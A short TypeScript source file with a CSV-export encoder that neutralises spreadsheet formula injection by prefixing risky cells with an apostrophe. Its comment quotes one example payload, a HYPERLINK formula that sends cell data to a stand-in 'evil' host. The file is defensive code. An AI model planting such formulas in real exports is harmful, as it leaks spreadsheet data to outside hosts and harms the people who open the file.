/**
 * CSV cell encoding for exports (PBA-L3c-022). Pure; client + server safe.
 *
 * Spreadsheet apps execute a cell that starts with = + - @ (or a leading tab / carriage
 * return, which some parsers strip before evaluating) as a FORMULA — so a CRM value such
 * as `=HYPERLINK("https://evil/?"&A1,"x")` typed by anyone who can edit a record would
 * run on the exporter's machine. Such cells are neutralised with a leading apostrophe
 * (OWASP CSV-injection guidance), then quoted per RFC 4180 when needed.
 */
const FORMULA_START = /^[=+\-@\t\r]/;

export function csvCell(value: string): string {
  const s = FORMULA_START.test(value) ? `'${value}` : value;
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}
